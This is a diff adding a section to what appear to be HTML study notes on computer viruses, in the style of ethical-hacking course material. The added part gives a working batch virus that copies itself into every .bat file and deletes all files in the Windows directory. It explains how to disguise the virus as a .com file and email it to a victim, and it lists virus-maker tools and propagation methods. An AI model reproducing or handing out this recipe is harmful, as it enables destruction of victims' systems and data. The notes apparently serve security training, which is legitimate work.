@@ -248,3 +248,33 @@ other files; however infection of external machines is only possible with the as
     <h2>Terminate and Stay Resident (TSR) Viruses</h2>
     <p>These viruses remains permanently in the target machine's memory during an entire work session, even after the target hosts program is executed and terminated. If the TSR virus infects the system, 
     the user needs to reboot the system to remove the virus without a trace.</p>
+
+    <h1>Infect systems using a virus</h1>
+    <h2>Creating Virus</h2>
+    <p>A virus can be created in two ways:</p>
+    <p><ol>
+        <ul><b>Writing a simple virus program</b>:</ul>
+        <ul>create a batch file named game.bat with the following text:</ul>
+        <ul>@ echo off</ul>
+        <ul>for %%f in (*.bat) do copy %%f + game.bat</ul>
+        <ul>del c:\Windows\*.*"</ul>
+        <ul>Convert the game.bat batch file into game.com using the bat2com utility</ul>
+        <ul>send the game.com file as an email attachment to the victim</ul>
+        <ul>when game.com is executed by the victim, it copies itself to all the .bat files in the current directory on the target machine and deletes all the files in the Windows directory</ul>
+    </ol></p>
+    <p><ol>
+        <ul><b>Using Virus maker tools</b>:</ul>
+        <ul>DELmE's Batch Virus Generator</ul>
+        <ul>JPS Virus Maker</ul>
+        <ul>Bhavesh Virus Maker SKW</ul>
+        <ul>Deadly Virus Maker</ul>
+        <ul>SonicBat Batch Virus Maker</ul>
+        <ul>TeraBit Virus Maker</ul>
+        <ul>Andreinick05's Batch Virus Maker</ul>
+    </ol></p>
+    <h2>Propagating and deploying virus</h2>
+    <p>After creating viruses, attacker can adopt various virus propagation and deployment techniques to transfer the virus to the victim's machine.</p>
+    <p><ol>
+        <ul>Virus Hoaxes</ul>
+        <ul>Fake Antivirus (two thirds of all antivirus applications present in the Android Play Store are fake !)</ul>
+    </ol></p>
